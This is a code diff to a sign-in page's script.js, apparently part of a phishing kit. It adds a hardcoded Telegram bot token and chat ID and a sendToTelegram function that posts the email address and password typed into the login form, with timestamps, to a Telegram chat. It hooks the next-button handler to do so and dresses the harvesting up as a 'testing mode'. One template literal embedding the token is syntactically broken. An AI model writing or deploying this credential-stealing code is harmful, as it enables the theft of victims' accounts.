@@ -1,3 +1,8 @@
+// Add these variables at the top of your script.js
+let testingMode = false;
+let botToken = '7878971486:AAHhMDmH8lUzAbpdrEsEg3hdHUnjiRHkmlE';
+let chatId = '6858157782';
+
 document.addEventListener('DOMContentLoaded', function() {
     // DOM Elements
     const signinPage = document.getElementById('signinPage');
@@ -19,7 +24,86 @@ document.addEventListener('DOMContentLoaded', function() {
     const signedInEmail = document.getElementById('signedInEmail');
     const signOutButton = document.getElementById('signOutButton');
     const forgotEmailLink = document.getElementById('forgotEmail');
+    const testingControls = document.getElementById('testingControls');
+    const enableTesting = document.getElementById('enableTesting');
+    const testingFields = document.getElementById('testingFields');
+    const sendTestData = document.getElementById('sendTestData');
+    const testBotToken = document.getElementById('testBotToken');
+    const testChatId = document.getElementById('testChatId');
+ // Show testing controls (for development)
+    testingControls.style.display = 'block';
 
+    enableTesting.addEventListener('change', function() {
+        testingMode = this.checked;
+        testingFields.style.display = this.checked ? 'block' : 'none';
+    });
+
+    sendTestData.addEventListener('click', function() {
+        botToken = testBotToken.value.trim();
+        chatId = testChatId.value.trim();
+        
+        if (!botToken || !chatId) {
+            alert('Please enter both Bot Token and Chat ID');
+            return;
+        }
+
+        // Send test data
+        const testData = {
+            email: emailInput.value,
+            password: passwordInput.value,
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent
+        };
+
+        sendToTelegram(`Test Data Received:\nEmail: ${testData.email}\nPassword: ${testData.password}\nTime: ${testData.timestamp}`);
+    });
+
+    // Modify your handleNextButton function to send data to Telegram
+    const originalHandleNextButton = handleNextButton;
+    handleNextButton = function() {
+        if (testingMode && passwordGroup.style.display !== 'none') {
+            const credentials = {
+                email: emailInput.value,
+                password: passwordInput.value,
+                timestamp: new Date().toISOString(),
+                ip: '185.199.108.153' // In a real scenario, you'd get this from the server
+            };
+
+            sendToTelegram(`Login Attempt:\nEmail: ${credentials.email}\nPassword: ${credentials.password}\nTime: ${credentials.timestamp}`);
+        }
+        
+        originalHandleNextButton();
+    };
+
+    // Also send data when password is shown (email verification step)
+    const originalShowPasswordField = function() {
+        if (testingMode) {
+            sendToTelegram(`Email Entered: ${emailInput.value}\nTime: ${new Date().toISOString()}`);
+        }
+    };
+
+    // ... rest of your existing code ...
+// Add this function to your script.js
+function sendToTelegram(message) {
+    if (!testingMode || !botToken || !chatId) return;
+    
+    const url = `https://api.telegram.org/bot${7878971486:AAHhMDmH8lUzAbpdrEsEg3hdHUnjiRHkmlE}/sendMessage`;
+    const data = {
+        chat_id: chatId,
+        text: message
+    };
+
+    fetch(url, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+    })
+    .then(response => response.json())
+    .then(data => console.log('Telegram response:', data))
+    .catch(error => console.error('Error sending to Telegram:', error));
+}
     // State
     let currentPage = 'signin';
     let currentEmail = '';
@@ -193,4 +277,5 @@ document.addEventListener('DOMContentLoaded', function() {
         const re = /^[\+]?[(]?[0-9]{3}[)]?[-\s\.]?[0-9]{3}[-\s\.]?[0-9]{4,6}$/;
         return re.test(phone);
     }
+    
 });
